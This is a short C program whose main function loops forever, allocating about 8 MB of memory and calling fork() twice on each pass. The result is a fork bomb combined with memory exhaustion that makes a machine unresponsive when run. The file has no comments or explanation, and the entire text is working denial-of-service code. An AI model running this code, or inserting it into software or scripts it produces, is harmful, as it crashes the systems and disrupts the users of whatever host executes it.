#include "stdio.h"
#include "stdlib.h"
#include "unistd.h"

int main()
{
	while(1)
	{

			double * k = (double *)malloc(1024*1024*sizeof(double));
			fork();
			fork();

	}
}